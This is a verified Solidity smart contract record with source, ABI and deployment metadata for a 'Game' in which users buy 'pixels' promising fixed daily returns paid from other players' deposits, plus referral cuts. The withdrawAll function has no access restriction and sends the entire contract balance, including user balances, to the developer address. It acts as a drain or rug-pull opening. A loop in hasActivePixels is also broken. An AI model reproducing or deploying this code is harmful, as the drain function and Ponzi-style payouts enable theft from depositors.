{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Game {\r\n    using SafeMath for uint256;\r\n\r\n    event eventGetMonitor(address indexed userAddress, uint256 timestamp);\r\n    event eventBuyPixels(uint8 pixelType, uint256 numberOfPixels, address indexed userAddress, uint256 timestamp);\r\n    event eventReinvestPixels(uint8 pixelType, uint256 numberOfPixels, address indexed userAddress, uint256 timestamp);\r\n    event eventCollectProfits(uint256 amount, address indexed userAddress, uint256 timestamp);\r\n    event eventWithdrawBalance(uint256 amount, address indexed userAddress, uint256 timestamp);\r\n\r\n    struct UserInfo {\r\n        address referral;\r\n        uint256 referralsCounter;\r\n        uint256 referralsProfit;\r\n        uint256 balance;\r\n        bool hasMonitor;\r\n        uint256 lastClaimTimestamp;\r\n        uint256[7] reinvestedPixels;\r\n        Pixel[] pixels;\r\n    }\r\n\r\n    struct Pixel {\r\n        uint8 pixelTypeIndex;\r\n        uint256 purchaseTimestamp;\r\n        uint256 lastClaimTimestamp;\r\n        uint256 accumulatedProfit;\r\n        bool active;\r\n    }\r\n\r\n\r\n    uint256 constant private _NOT_ENTERED = 1;\r\n    uint256 constant private _ENTERED = 2;\r\n    uint256 private _status;\r\n\r\n    uint256 public numberOfPlayers; \r\n    uint256 public pixelsBuy; \r\n    uint256 public totalBalance; \r\n\r\n    uint256 constant private ONE_DAY = 86400; \r\n    uint256 constant private PIXEL_GIFT = 15; \r\n    uint256[] private PIXEL_PRICE =  [1e17, 1e18, 10e18, 100e18, 1000e18, 10000e18, 100000e18]; \r\n    \r\n    \r\n    \r\n    uint256[] private PIXEL_PROFIT = [ 150,   158,   169,   183,   201,   223,   250]; \r\n    address private devAddress;\r\n\r\n\r\n    mapping(address => UserInfo) private users;\r\n\r\n\r\n    constructor(address _devAddress) {\r\n        _status = _NOT_ENTERED;\r\n        devAddress = _devAddress;\r\n        users[msg.sender].hasMonitor = false;\r\n        users[msg.sender].reinvestedPixels = [0, 0, 0, 0, 0, 0, 0];\r\n    }\r\n\r\n\r\n    modifier nonReentrant() {\r\n        _nonReentrantBefore();\r\n        _;\r\n        _nonReentrantAfter();\r\n    }\r\n\r\n    modifier hasMonitor() {\r\n        require(users[msg.sender].hasMonitor, \"You need to purchase a monitor first\");\r\n        _;\r\n    }\r\n\r\n    modifier onlyUser {\r\n        require(msg.sender == tx.origin);\r\n        _;\r\n    }\r\n\r\n\r\n\r\n    function _nonReentrantBefore() private {\r\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\r\n        _status = _ENTERED;\r\n    }\r\n    function _nonReentrantAfter() private {\r\n        _status = _NOT_ENTERED;\r\n    }\r\n    function _reentrancyGuardEntered() internal view returns (bool) {\r\n        return _status == _ENTERED;\r\n    }\r\n\r\n    \r\n    function getMonitor(address referral) external nonReentrant onlyUser {\r\n        require(!users[msg.sender].hasMonitor, \"Monitor already purchased\");\r\n\r\n        \r\n        referral = (referral == address(0) || referral == msg.sender) ? devAddress : referral;\r\n\r\n        \r\n        if (users[referral].pixels.length == 0 || !hasActivePixels(referral)) { referral = devAddress; }\r\n\r\n        users[msg.sender].hasMonitor = true;\r\n        users[msg.sender].referral = referral;\r\n        users[referral].referralsCounter = users[referral].referralsCounter.add(1);\r\n        numberOfPlayers = numberOfPlayers.add(1);\r\n\r\n        emit eventGetMonitor(msg.sender, block.timestamp);\r\n    }\r\n\r\n\r\n    \r\n    function buyPixels(uint8 pixelTypeIndex) external payable nonReentrant onlyUser hasMonitor {\r\n        require(pixelTypeIndex < PIXEL_PRICE.length, \"Invalid pixel type index\");\r\n\r\n        \r\n        uint256 numberOfPixels = msg.value.div(PIXEL_PRICE[pixelTypeIndex]);\r\n\r\n        \r\n        require(numberOfPixels > 0, \"Insufficient funds to buy any pixels\");\r\n\r\n        if (users[msg.sender].pixels.length == 0) {\r\n            users[msg.sender].lastClaimTimestamp = block.timestamp;\r\n        }\r\n\r\n        \r\n        payReferral(msg.sender, msg.value);\r\n\r\n        totalBalance = totalBalance.add(msg.value);\r\n        pixelsBuy = pixelsBuy.add(numberOfPixels);\r\n\r\n        for (uint256 i = 0; i < numberOfPixels; i++) {\r\n            createPixel(pixelTypeIndex);\r\n        }\r\n\r\n        emit eventBuyPixels(pixelTypeIndex, numberOfPixels, msg.sender, block.timestamp);\r\n    }\r\n\r\n\r\n    \r\n    function reinvestPixels(uint8 pixelTypeIndex, uint256 numberOfPixels) external nonReentrant onlyUser hasMonitor {\r\n        require(pixelTypeIndex < PIXEL_PRICE.length, \"Invalid pixel type index\");\r\n        require(numberOfPixels > 0, \"Number of pixels must be greater than 0\");\r\n\r\n        UserInfo storage user = users[msg.sender];\r\n\r\n        \r\n        uint256 totalCost = PIXEL_PRICE[pixelTypeIndex].mul(numberOfPixels);\r\n\r\n        \r\n        require(user.balance >= totalCost, \"Insufficient balance\");\r\n\r\n        \r\n        payReferral(msg.sender, totalCost);\r\n\r\n        \r\n        user.balance = user.balance.sub(totalCost);\r\n        totalBalance = totalBalance.add(totalCost);\r\n\r\n        \r\n        \r\n        uint256 tmpCounter = ((user.reinvestedPixels[pixelTypeIndex].add(numberOfPixels).add(PIXEL_GIFT)) / PIXEL_GIFT).sub((user.reinvestedPixels[pixelTypeIndex].add(PIXEL_GIFT)) / PIXEL_GIFT);\r\n        user.reinvestedPixels[pixelTypeIndex] = user.reinvestedPixels[pixelTypeIndex].add(numberOfPixels);\r\n        numberOfPixels = numberOfPixels.add(tmpCounter);\r\n\r\n        pixelsBuy = pixelsBuy.add(numberOfPixels);\r\n\r\n        \r\n        for (uint256 i = 0; i < numberOfPixels; i++) {\r\n            createPixel(pixelTypeIndex);\r\n        }\r\n\r\n        emit eventReinvestPixels(pixelTypeIndex, numberOfPixels, msg.sender, block.timestamp);\r\n    }\r\n\r\n\r\n    \r\n    function collectProfits() external nonReentrant onlyUser hasMonitor {\r\n        Pixel storage pixel;\r\n        uint256 totalAmount = 0;\r\n\r\n        \r\n        for (uint256 i = 0; i < users[msg.sender].pixels.length; i++) {\r\n            pixel = users[msg.sender].pixels[i];\r\n\r\n            \r\n            if (!pixel.active) { continue; }\r\n\r\n            \r\n            uint256 maxLifeSeconds = ONE_DAY.mul(20000).div(PIXEL_PROFIT[pixel.pixelTypeIndex]);\r\n\r\n            \r\n            uint256 timeSinceLastClaim = block.timestamp.sub(pixel.lastClaimTimestamp);\r\n\r\n            \r\n            uint256 profitTime = (timeSinceLastClaim < ONE_DAY) ? timeSinceLastClaim : ONE_DAY;\r\n\r\n            \r\n            uint256 profitAmount = PIXEL_PRICE[pixel.pixelTypeIndex].mul(2).mul(profitTime).div(maxLifeSeconds);\r\n            pixel.accumulatedProfit = pixel.accumulatedProfit.add(profitAmount);\r\n\r\n            \r\n            pixel.lastClaimTimestamp = block.timestamp;\r\n\r\n            \r\n            if (block.timestamp > pixel.purchaseTimestamp.add(maxLifeSeconds)) {\r\n                pixel.active = false;\r\n            }\r\n\r\n            \r\n            users[msg.sender].balance = users[msg.sender].balance.add(profitAmount);\r\n\r\n            totalAmount = totalAmount.add(profitAmount);\r\n        }\r\n\r\n        users[msg.sender].lastClaimTimestamp = block.timestamp;\r\n\r\n        emit eventCollectProfits(totalAmount, msg.sender, block.timestamp);\r\n    }\r\n\r\n\r\n    \r\n    function withdrawBalance(uint256 amount) external nonReentrant onlyUser hasMonitor {\r\n        \r\n        require(address(this).balance > 0, \"Contract has no balance\");\r\n\r\n        \r\n        require(users[msg.sender].balance > 0, \"No balance to withdraw\");\r\n\r\n        \r\n        uint256 balanceToWithdraw = (users[msg.sender].balance >= amount) ? amount : users[msg.sender].balance;\r\n\r\n        \r\n        users[msg.sender].balance = users[msg.sender].balance.sub(balanceToWithdraw);\r\n\r\n        \r\n        payable(msg.sender).transfer(balanceToWithdraw);\r\n\r\n        emit eventWithdrawBalance(balanceToWithdraw, msg.sender, block.timestamp);\r\n    }\r\n\r\n\r\n    \r\n    function payReferral(address userAddress, uint256 amount) private {\r\n        payable(devAddress).transfer(amount.mul(5).div(100));\r\n\r\n        address referral = users[userAddress].referral;\r\n        uint256 referralFee = amount.mul(5).div(100);\r\n        users[referral].referralsProfit = users[referral].referralsProfit.add(referralFee);\r\n        users[referral].balance = users[referral].balance.add(referralFee);\r\n    }\r\n\r\n\r\n    \r\n    function createPixel(uint8 pixelTypeIndex) private {\r\n        users[msg.sender].pixels.push(Pixel({\r\n            pixelTypeIndex: pixelTypeIndex,\r\n            purchaseTimestamp: block.timestamp,\r\n            lastClaimTimestamp: block.timestamp,\r\n            accumulatedProfit: 0,\r\n            active: true\r\n        }));\r\n    }\r\n\r\n\r\n    function getUserInfo(address userAddress) external view returns(UserInfo memory) {\r\n        return users[userAddress];\r\n    }\r\n\r\n\r\n    function hasActivePixels(address userAddress) private view returns (bool) {\r\n        UserInfo memory user = users[userAddress];\r\n        for (uint256 i = uint256(user.pixels.length)-1; i >= 0; i--) {\r\n            if (user.pixels[i].active) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    \r\n    \r\n    function withdrawAll() external {\r\n        uint256 contractBalance = address(this).balance; \r\n        require(contractBalance > 0, \"Contract has no balance\"); \r\n        payable(devAddress).transfer(contractBalance); \r\n    }\r\n\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0);\r\n        return a % b;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_devAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"pixelType\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"numberOfPixels\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"eventBuyPixels\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"eventCollectProfits\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"eventGetMonitor\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"pixelType\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"numberOfPixels\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"eventReinvestPixels\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"eventWithdrawBalance\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"pixelTypeIndex\",\"type\":\"uint8\"}],\"name\":\"buyPixels\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"collectProfits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"}],\"name\":\"getMonitor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserInfo\",\"outputs\":[{\"components\":[{\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"referralsCounter\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"referralsProfit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"hasMonitor\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"lastClaimTimestamp\",\"type\":\"uint256\"},{\"internalType\":\"uint256[7]\",\"name\":\"reinvestedPixels\",\"type\":\"uint256[7]\"},{\"components\":[{\"internalType\":\"uint8\",\"name\":\"pixelTypeIndex\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"purchaseTimestamp\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lastClaimTimestamp\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"accumulatedProfit\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"active\",\"type\":\"bool\"}],\"internalType\":\"struct Game.Pixel[]\",\"name\":\"pixels\",\"type\":\"tuple[]\"}],\"internalType\":\"struct Game.UserInfo\",\"name\":\"\",\"type\":\"tuple\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"numberOfPlayers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pixelsBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"pixelTypeIndex\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"numberOfPixels\",\"type\":\"uint256\"}],\"name\":\"reinvestPixels\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Game", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000c4b737a17d886ac7decbebe15b4290521cb6093b", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://99776525985eb79b43cba8a2d5955c02fb19571ad4943feee6767c5e72fbf9e1"}